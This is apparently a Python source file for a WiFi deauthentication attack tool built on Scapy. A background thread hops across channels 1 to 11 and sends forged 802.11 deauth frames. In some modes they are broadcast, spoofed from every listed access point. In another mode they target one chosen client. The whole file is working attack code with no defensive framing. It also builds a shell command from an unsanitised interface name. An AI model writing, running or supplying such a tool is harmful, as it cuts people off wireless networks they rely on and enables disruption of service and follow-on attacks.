from scapy.layers.dot11 import Dot11, Dot11Deauth
import threading
from scapy.all import *
import Channel


class HoverThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.flag = False
        self.daemon = True
        self.mode =  None
        self.channel = 1
        self.ap_list = None
        self.lock = threading.Lock()
        self.is_hacking = False
        self.client = None
        self.ap = None
    def run(self):
        try:
            while True:
                interface = conf.iface
                self.switch(interface, self.channel)

                if self.is_hacking ==True:
                    self.hack()
                else:
                    time.sleep(1)
                if self.channel is 11:
                    with self.lock:
                        self.channel = 1
                        Channel.channel=self.channel
                else:
                    with self.lock:
                        self.channel+=1
                        Channel.channel=self.channel

        except Exception as e:
            print e

    def hack(self):
        if self.mode is "ALL":
            for ap in self.ap_list:
                if int(ap[1]) == self.channel:
                    address = ap[0]
                    deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=address, addr3=address)/Dot11Deauth()
                    send(deauth_ap, inter=0.00001, count=5)

        elif self.mode is "AP":
            for ap in self.ap_list:
                if int(ap[1]) == self.channel:
                    address = ap[0]
                    deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=address, addr3=address)/Dot11Deauth()
                    send(deauth_ap, inter=0.00001, count=5)

        elif self.mode is "CLIENT":

            if int(self.ap[1]) == self.channel:
                deauth_ap = Dot11(addr1=self.client, addr2=self.ap[0], addr3=self.ap[0])/Dot11Deauth()
                send(deauth_ap, inter=0.00001, count=5)


    def switch(self, interface, channel):
        os.system("iw dev "+interface+" set channel "+str(channel))